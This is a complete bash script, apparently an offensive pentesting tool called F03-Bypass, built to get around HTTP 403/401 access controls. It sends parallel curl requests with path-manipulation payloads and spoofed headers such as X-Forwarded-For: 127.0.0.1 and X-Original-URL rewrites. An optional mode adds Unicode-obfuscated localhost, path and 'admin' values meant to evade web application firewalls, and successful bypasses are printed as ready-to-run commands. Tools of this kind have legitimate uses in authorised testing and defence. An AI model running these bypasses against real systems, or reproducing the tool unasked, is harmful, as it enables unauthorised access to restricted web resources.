#!/bin/bash

red='\e[31m'
green='\e[32m'
blue='\e[34m'
BOLD_WHITE='\033[1;97m'
cyan='\e[96m'
yellow='\e[33m'
end='\e[0m'
BOLD='\033[1m'
termwidth="$(tput cols)"
default_method="GET"
method=""
max_jobs=5  # Adjust this to change speed (parallel requests)
headers=()
test_mode="url"
post_data=""
filter_sizes=()
filter_regex=""
timeout=10  # Default timeout in seconds
show_timeouts=true  # Show timeout messages by default
waf_bypass=false  # WAF bypass mode



banner() {
    echo -e "${cyan}${BOLD}"
    cat << "EOF"
     _____ ___ ____      ____
    |  ___/ _ \___ \    |  _ \                          
    | |_ | | | |__) |___| |_) |_   _ _ __   __ _ ___ ___
    |  _|| | | |__ <____|  _ <| | | | '_ \ / _` / __/ __|
    | |  | |_| |__) |   | |_) | |_| | |_) | (_| \__ \__ \
    |_|   \___/____/    |____/ \__, | .__/ \__,_|___/___/
                                __/ | |                  
        Coded By @mugh33ra     |___/|_|                  
           X: @mugh33ra
EOF
    echo -e "${end}"
}

help_usage() {
    echo "Usage: $0 -u <url> [options]"
    echo "Options:"
    echo "  -u, --url        Specify <Target_Url>"
    echo "  -m, --method     Specify Method <POST, PUT, PATCH> (Default, GET)"
    echo "  -d, --data       POST data to send with request (e.g., 'param1=value1&param2=value2')"
    echo "  -H, --header     Add custom header (repeatable)"
    echo "  -fs, --filter-size Filter out responses with specific size"
    echo "                   Use multiple times: -fs 1234 -fs 5678"
    echo "                   OR comma-separated: -fs 1234,5678,9999"
    echo "  -fr, --filter-regex Filter out responses matching regex pattern in body (e.g., -fr 'error|forbidden')"
    echo "  -t, --timeout    Request timeout in seconds (default: 10)"
    echo "  -st, --skip-timeout Skip displaying timeout errors (cleaner output)"
    echo "  -a, --all        Run both URL encode and header bypass tests"
    echo "  -wb, --waf-bypass Enable WAF bypass techniques (localhost, obfuscation, etc.)"
    echo "  -h, --help       Display help and exit"
}

if [[ $# -eq 0 ]]; then
    banner
    echo "[!] Error: use -h/--help for help menu"
    exit 1
fi

while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            [[ -n $2 && $2 != -* ]] && {
                target=${2%/};
                pat=$(echo $2 | cut -d "/" -f4- );
                base_url=$(echo $2 | cut -d "/" -f1-3);
                shift 2;
            } || { echo "[!] Url is missing"; exit 1; } ;;
        -m|--method)
            [[ -n $2 && $2 != -* ]] && { method=$2; shift 2; } || { echo "[!] Method missing"; exit 1; } ;;
        -d|--data)
            [[ -n $2 && $2 != -* ]] && { post_data=$2; shift 2; } || { echo "[!] Data missing"; exit 1; } ;;
        -H|--header)
            [[ -n $2 && $2 != -* ]] && {
                headers+=("-H" "$2")
                shift 2
            } || { echo "[!] Header missing"; exit 1; } ;;
        -fs|--filter-size)
            [[ -n $2 && $2 != -* ]] && {
                # Support comma-separated values
                IFS=',' read -ra SIZES <<< "$2"
                for size in "${SIZES[@]}"; do
                    filter_sizes+=("$size")
                done
                shift 2
            } || { echo "[!] Filter size missing"; exit 1; } ;;
        -fr|--filter-regex)
            [[ -n $2 && $2 != -* ]] && { filter_regex=$2; shift 2; } || { echo "[!] Filter regex missing"; exit 1; } ;;
        -t|--timeout)
            [[ -n $2 && $2 != -* ]] && { timeout=$2; shift 2; } || { echo "[!] Timeout value missing"; exit 1; } ;;
        -st|--skip-timeout)
            show_timeouts=false
            shift ;;
        -wb|--waf-bypass)
            waf_bypass=true
            shift ;;
        -a|--all)
            test_mode="all"
            shift ;;
        -h|--help)
            banner; help_usage; exit 0; shift ;;
        *) echo "[!] Unknown flag $1"; exit 1 ;;
    esac
done

method=${method:-$default_method}
[[ ! -f "payloads.txt" ]] && { echo -e "${red}[!] payloads.txt not found${end}"; exit 1; }

if [[ -n "$pat" ]]; then
    header_bypasses=(
        # 127.0.0.1 variants
        "Client-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "Cluster-Client-IP: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-Originating-IP: 127.0.0.1"
        "X-ProxyUser-Ip: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Forwarded: 127.0.0.1"
        "X-Forwarded-By: 127.0.0.1"
        "X-Forwarded-Host: 127.0.0.1"
        "X-Forwarded-Port: 80"
        "X-Forwarded-Server: 127.0.0.1"
        "Forwarded-For: 127.0.0.1"
        "Redirect: 127.0.0.1"
        "Referer: 127.0.0.1"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-True-IP: 127.0.0.1"
        "X-Host: 127.0.0.1"
        "X-Http-Host-Override: 127.0.0.1"
        # localhost variants
        "Client-IP: localhost"
        "True-Client-IP: localhost"
        "Cluster-Client-IP: localhost"
        "X-Real-IP: localhost"
        "X-Client-IP: localhost"
        "X-Remote-IP: localhost"
        "X-Remote-Addr: localhost"
        "X-Originating-IP: localhost"
        "X-ProxyUser-Ip: localhost"
        "X-Forwarded-For: localhost"
        "X-Forwarded: localhost"
        "X-Forwarded-By: localhost"
        "X-Forwarded-Host: localhost"
        "X-Forwarded-Server: localhost"
        "Forwarded-For: localhost"
        "Redirect: localhost"
        "Referer: localhost"
        "X-Custom-IP-Authorization: localhost"
        "X-True-IP: localhost"
        "X-Host: localhost"
        "X-Http-Host-Override: localhost"
        # Path rewrite headers
        "X-Original-URL: ${pat}"
        "X-Rewrite-URL: ${pat}"
        "X-Original-Uri: ${pat}"
        "X-Rewrite-Uri: ${pat}"
    )

    # WAF Bypass headers using Unicode Normalization (NFKC/NFKD)
    # Focused on 403/401 bypass only
    # Based on: https://jlajara.gitlab.io/Bypass_WAF_Unicode
    waf_bypass_headers=(
        # ============================================
        # IP SPOOFING - Unicode obfuscated localhost/127.0.0.1
        # ============================================
        
        # Fullwidth localhost
        "X-Forwarded-For: ｌｏｃａｌｈｏｓｔ"
        "X-Real-IP: ｌｏｃａｌｈｏｓｔ"
        "X-Client-IP: ｌｏｃａｌｈｏｓｔ"
        "X-Host: ｌｏｃａｌｈｏｓｔ"
        "X-Forwarded-Host: ｌｏｃａｌｈｏｓｔ"
        "True-Client-IP: ｌｏｃａｌｈｏｓｔ"
        "Client-IP: ｌｏｃａｌｈｏｓｔ"
        
        # Circled numbers for 127.0.0.1
        "X-Forwarded-For: ①②⑦.⓪.⓪.①"
        "X-Real-IP: ①②⑦.⓪.⓪.①"
        "X-Client-IP: ①②⑦.⓪.⓪.①"
        "True-Client-IP: ①②⑦.⓪.⓪.①"
        "Client-IP: ①②⑦.⓪.⓪.①"
        
        # Fullwidth digits for 127.0.0.1
        "X-Forwarded-For: １２７.０.０.１"
        "X-Real-IP: １２７.０.０.１"
        "X-Client-IP: １２７.０.０.１"
        "True-Client-IP: １２７.０.０.１"
        "Client-IP: １２７.０.０.１"
        "X-Host: １２７.０.０.１"
        "X-Forwarded-Host: １２７.０.０.１"
        
        # Ideographic full stop 。 (U+3002) → .
        "X-Forwarded-For: 127。0。0。1"
        "X-Real-IP: 127。0。0。1"
        "X-Client-IP: 127。0。0。1"
        "X-Forwarded-Host: 127。0。0。1"
        
        # Mixed Unicode/ASCII for 127.0.0.1
        "X-Forwarded-For: １２７.0.0.1"
        "X-Real-IP: 127。０。０。１"
        "X-Client-IP: ①②⑦.0.0.1"
        
        # ============================================
        # PATH REWRITING - Unicode obfuscated paths
        # ============================================
        
        # Fullwidth slash ／ (U+FF0F) → /
        "X-Original-URL: ／${pat}"
        "X-Rewrite-URL: ／${pat}"
        "X-Original-Uri: ／${pat}"
        "X-Rewrite-Uri: ／${pat}"
        
        # Double fullwidth slash
        "X-Original-URL: ／／${pat}"
        "X-Rewrite-URL: ／／${pat}"
        
        # Path traversal with ‥ (U+2025) → ..
        "X-Original-URL: ‥／${pat}"
        "X-Rewrite-URL: ‥／‥／${pat}"
        
        # Fraction slash ⁄ (U+2044) → /
        "X-Original-URL: ⁄${pat}"
        "X-Rewrite-URL: ⁄⁄${pat}"
        
        # Fullwidth colon ： (U+FF1A) → :
        "X-Original-URL: http：／／localhost／${pat}"
        "X-Rewrite-URL: http：／／127。0。0。1／${pat}"
        
        # Mixed Unicode paths
        "X-Original-URL: ／／ｌｏｃａｌｈｏｓｔ／${pat}"
        "X-Rewrite-URL: http：／／１２７．０．０．１／${pat}"
        
        # ============================================
        # AUTHENTICATION BYPASS - Unicode usernames
        # ============================================
        
        # Fullwidth 'admin'
        "X-User: ａｄｍｉｎ"
        "X-Username: ａｄｍｉｎ"
        "X-Authenticated-User: ａｄｍｉｎ"
        "X-User-ID: ａｄｍｉｎ"
        
        # Uppercase fullwidth 'ADMIN'
        "X-User: ＡＤＭＩＮ"
        "X-Username: ＡＤＭＩＮ"
        
        # Business logic bypass - ª (U+00AA) → a
        "X-User: ªdmin"
        "X-Username: ªdmin"
        "X-Authenticated-User: ªdmin"
        
        # º (U+00BA) → o
        "X-User: adminºr"
        "X-Username: rººt"
        
        # ============================================
        # PROTOCOL/SCHEME BYPASS
        # ============================================
        
        # Fullwidth protocols
        "X-Forwarded-Proto: ｈｔｔｐｓ"
        "X-Forwarded-Scheme: ｈｔｔｐｓ"
        "X-URL-Scheme: ｈｔｔｐｓ"
        
        # ============================================
        # MIXED COMPLEX BYPASSES
        # ============================================
        
        # Complex IP + Path
        "X-Forwarded-For: ｌｏｃａｌｈｏｓｔ|X-Original-URL: ／${pat}"
        "X-Real-IP: １２７。０。０。１|X-Rewrite-URL: ／／${pat}"
        
        # Auth + IP
        "X-User: ａｄｍｉｎ|X-Forwarded-For: ①②⑦.⓪.⓪.①"
    )
fi

should_filter_size() {
    local size="$1"
    for filter_size in "${filter_sizes[@]}"; do
        if [[ "$size" == "$filter_size" ]]; then
            return 0  # True, should filter
        fi
    done
    return 1  # False, should not filter
}

run_check() {
    local p="$1"
    local current_p=$(echo "$p" | sed "s|\${pat}|$pat|g")
    local path_is_is_flag=""
    local temp_body=""

    # Enable --path-as-is only when curl would normalize the path
    if [[ "$current_p" =~ (//|/\.\./|\.\./|%2e|%252e|%2f|\\|;) ]]; then
        path_is_is_flag="--path-as-is"
    fi

    # Create temp file for body if regex filter is enabled
    if [[ -n "$filter_regex" ]]; then
        temp_body=$(mktemp)
    fi

    # Build curl command with conditional data flag
    if [[ -n "$post_data" ]]; then
        if [[ -n "$filter_regex" ]]; then
            local res=$(curl -k -s $path_is_is_flag "${headers[@]}" \
                -o "$temp_body" -w "%{http_code}|%{size_download}" \
                --max-time "$timeout" --connect-timeout "$timeout" \
                "${target}${current_p}" -X "$method" -d "$post_data" -H "User-Agent: Mozilla/5.0")
        else
            local res=$(curl -k -s $path_is_is_flag "${headers[@]}" \
                -o /dev/null -w "%{http_code}|%{size_download}" \
                --max-time "$timeout" --connect-timeout "$timeout" \
                "${target}${current_p}" -X "$method" -d "$post_data" -H "User-Agent: Mozilla/5.0")
        fi
    else
        if [[ -n "$filter_regex" ]]; then
            local res=$(curl -k -s $path_is_is_flag "${headers[@]}" \
                -o "$temp_body" -w "%{http_code}|%{size_download}" \
                --max-time "$timeout" --connect-timeout "$timeout" \
                "${target}${current_p}" -X "$method" -H "User-Agent: Mozilla/5.0")
        else
            local res=$(curl -k -s $path_is_is_flag "${headers[@]}" \
                -o /dev/null -w "%{http_code}|%{size_download}" \
                --max-time "$timeout" --connect-timeout "$timeout" \
                "${target}${current_p}" -X "$method" -H "User-Agent: Mozilla/5.0")
        fi
    fi

    local st=$(echo "$res" | cut -d'|' -f1)
    local len=$(echo "$res" | cut -d'|' -f2)

    # Check for timeout (curl returns 000 or empty on timeout)
    if [[ -z "$st" || "$st" == "000" ]]; then
        [[ -n "$temp_body" ]] && rm -f "$temp_body"
        if [[ "$show_timeouts" == "true" ]]; then
            echo -e "Payload [ ${yellow}${current_p}${end} ]: ${red}TIMEOUT (${timeout}s)${end}"
        fi
        return
    fi

    # Filter by regex pattern in body
    if [[ -n "$filter_regex" && -f "$temp_body" ]]; then
        if grep -qiE "$filter_regex" "$temp_body"; then
            rm -f "$temp_body"
            return
        fi
        rm -f "$temp_body"
    fi

    # Filter out responses with specified sizes
    if should_filter_size "$len"; then
        return
    fi

    if [[ "$st" =~ ^2 ]]; then
        color="${green}"
    elif [[ "$st" =~ ^3 ]]; then
        color="${yellow}"
    elif [[ "$st" =~ 405 || "$st" =~ 401 || "$st" =~ 429 ]]; then
        color="${blue}"
    elif [[ "$st" =~ ^4[0-9]{2}$ ]]; then
        color="${red}"
    else
        color="${cyan}"
    fi

    echo -e "Payload [ ${yellow}${current_p}${end} ]: ${color}Status: $st, Length : $len${end}"

    if [[ "$st" =~ ^2 ]]; then
        local line=$(printf '%.0s─' $(seq 1 $((termwidth - 2))))
        echo -e "╭${line}╮"
        echo -e " Payload [ ${yellow}${current_p}${end} ]:"
        echo -e " METHOD: '${cyan}${method}${end}'"
        if [[ -n "$post_data" ]]; then
            echo -e " DATA: '${cyan}${post_data}${end}'"
            echo -e " COMMAND: ${cyan}curl -k -s $path_is_is_flag -X $method '${target}${current_p}' ${headers[*]} -d '${post_data}' -H 'User-Agent: Mozilla/5.0'${end}"
        else
            echo -e " COMMAND: ${cyan}curl -k -s $path_is_is_flag -X $method '${target}${current_p}' ${headers[*]} -H 'User-Agent: Mozilla/5.0'${end}"
        fi
        echo -e "╰${line}╯"
    fi
}

run_header_check() {
    local header="$1"
    local current_header=$(echo "$header" | sed "s|\${pat}|$pat|g")
    local temp_body=""

    if [[ "$current_header" =~ ^X-(Original|Rewrite)-(URL|Uri): ]]; then
        local test_url="${base_url}/"
        local header_value=$(echo "$current_header" | cut -d':' -f2- | sed 's/^ //')
    else
        local test_url="${target}"
        local header_value=$(echo "$current_header" | cut -d':' -f2- | sed 's/^ //')
    fi

    # Create temp file for body if regex filter is enabled
    if [[ -n "$filter_regex" ]]; then
        temp_body=$(mktemp)
    fi

    # Build curl command with conditional data flag
    if [[ -n "$post_data" ]]; then
        if [[ -n "$filter_regex" ]]; then
            local res=$(curl -k -s "${headers[@]}" -H "$current_header" \
                -o "$temp_body" -w "%{http_code}|%{size_download}" \
                --max-time "$timeout" --connect-timeout "$timeout" \
                "$test_url" -X "$method" -d "$post_data" -H "User-Agent: Mozilla/5.0")
        else
            local res=$(curl -k -s "${headers[@]}" -H "$current_header" \
                -o /dev/null -w "%{http_code}|%{size_download}" \
                --max-time "$timeout" --connect-timeout "$timeout" \
                "$test_url" -X "$method" -d "$post_data" -H "User-Agent: Mozilla/5.0")
        fi
    else
        if [[ -n "$filter_regex" ]]; then
            local res=$(curl -k -s "${headers[@]}" -H "$current_header" \
                -o "$temp_body" -w "%{http_code}|%{size_download}" \
                --max-time "$timeout" --connect-timeout "$timeout" \
                "$test_url" -X "$method" -H "User-Agent: Mozilla/5.0")
        else
            local res=$(curl -k -s "${headers[@]}" -H "$current_header" \
                -o /dev/null -w "%{http_code}|%{size_download}" \
                --max-time "$timeout" --connect-timeout "$timeout" \
                "$test_url" -X "$method" -H "User-Agent: Mozilla/5.0")
        fi
    fi

    local st=$(echo "$res" | cut -d'|' -f1)
    local len=$(echo "$res" | cut -d'|' -f2)

    # Check for timeout (curl returns 000 or empty on timeout)
    if [[ -z "$st" || "$st" == "000" ]]; then
        [[ -n "$temp_body" ]] && rm -f "$temp_body"
        if [[ "$show_timeouts" == "true" ]]; then
            echo -e "Header [ ${yellow}${current_header}${end} ]: ${red}TIMEOUT (${timeout}s)${end}"
        fi
        return
    fi

    # Filter by regex pattern in body
    if [[ -n "$filter_regex" && -f "$temp_body" ]]; then
        if grep -qiE "$filter_regex" "$temp_body"; then
            rm -f "$temp_body"
            return
        fi
        rm -f "$temp_body"
    fi

    # Filter out responses with specified sizes
    if should_filter_size "$len"; then
        return
    fi

    if [[ "$st" =~ ^2 ]]; then
        color="${green}"
    elif [[ "$st" =~ ^3 ]]; then
        color="${yellow}"
    elif [[ "$st" =~ ^4 ]]; then
        color="${red}"
    else
        color="${cyan}"
    fi

    echo -e "Header [ ${yellow}${current_header}${end} ]: ${color}Status: $st, Length : $len${end}"

    if [[ "$st" =~ ^2 ]]; then
        local line=$(printf '%.0s─' $(seq 1 $((termwidth - 2))))
        echo -e "╭${line}╮"
        echo -e " Header [ ${yellow}${current_header}${end} ]:"
        echo -e " METHOD: '${cyan}${method}${end}'"
        if [[ "$current_header" =~ ^X-(Original|Rewrite)-(URL|Uri): ]]; then
            echo -e " URL: '${cyan}${base_url}/${end}'"
        else
            echo -e " URL: '${cyan}${target}${end}'"
        fi
        if [[ -n "$post_data" ]]; then
            echo -e " DATA: '${cyan}${post_data}${end}'"
            echo -e " COMMAND: ${cyan}curl -k -s -X $method '${test_url}' ${headers[*]} -H '$current_header' -d '${post_data}' -H 'User-Agent: Mozilla/5.0'${end}"
        else
            echo -e " COMMAND: ${cyan}curl -k -s -X $method '${test_url}' ${headers[*]} -H '$current_header' -H 'User-Agent: Mozilla/5.0'${end}"
        fi
        echo -e "╰${line}╯"
    fi
}

encode_bypass() {
    echo -e "${blue}+--------------------------------+${end}"
    echo -e "${cyan}|[+] URL Encode Bypass (Parallel)|${end}"
    echo -e "${blue}+--------------------------------+${end}"

    if [[ ${#filter_sizes[@]} -gt 0 ]]; then
        echo -e "${yellow}[i] Filtering sizes: ${filter_sizes[*]}${end}"
    fi
    if [[ -n "$filter_regex" ]]; then
        echo -e "${yellow}[i] Filtering regex: ${filter_regex}${end}"
    fi
    echo -e "${yellow}[i] Request timeout: ${timeout}s${end}"

    set -f
    while IFS= read -r p || [[ -n "$p" ]]; do
        [[ -z "$p" ]] && continue

        run_check "$p" &

        if [[ $(jobs -r | wc -l) -ge $max_jobs ]]; then
            wait -n
        fi
    done < "payloads.txt"

    wait
    set +f
}

header_bypass() {
    echo -e "${blue}+----------------------------+${end}"
    echo -e "${cyan}|[+] Header Bypass (Parallel)|${end}"
    echo -e "${blue}+----------------------------+${end}"

    if [[ ${#filter_sizes[@]} -gt 0 ]]; then
        echo -e "${yellow}[i] Filtering sizes: ${filter_sizes[*]}${end}"
    fi
    if [[ -n "$filter_regex" ]]; then
        echo -e "${yellow}[i] Filtering regex: ${filter_regex}${end}"
    fi
    echo -e "${yellow}[i] Request timeout: ${timeout}s${end}"

    for header in "${header_bypasses[@]}"; do
        [[ -z "$header" ]] && continue

        run_header_check "$header" &

        if [[ $(jobs -r | wc -l) -ge $max_jobs ]]; then
            wait -n
        fi
    done

    wait
}

waf_bypass() {
    echo -e "${blue}+---------------------------+${end}"
    echo -e "${cyan}|[+] WAF Bypass (Parallel)  |${end}"
    echo -e "${blue}+---------------------------+${end}"

    if [[ ${#filter_sizes[@]} -gt 0 ]]; then
        echo -e "${yellow}[i] Filtering sizes: ${filter_sizes[*]}${end}"
    fi
    if [[ -n "$filter_regex" ]]; then
        echo -e "${yellow}[i] Filtering regex: ${filter_regex}${end}"
    fi
    echo -e "${yellow}[i] Request timeout: ${timeout}s${end}"

    for header in "${waf_bypass_headers[@]}"; do
        [[ -z "$header" ]] && continue

        run_header_check "$header" &

        if [[ $(jobs -r | wc -l) -ge $max_jobs ]]; then
            wait -n
        fi
    done

    wait
}

main() {
    banner

    if [[ "$test_mode" == "url" ]]; then
        encode_bypass
        if [[ "$waf_bypass" == "true" ]]; then
            echo ""
            waf_bypass
        fi
    elif [[ "$test_mode" == "all" ]]; then
        encode_bypass
        echo ""
        header_bypass
        if [[ "$waf_bypass" == "true" ]]; then
            echo ""
            waf_bypass
        fi
    fi
}

main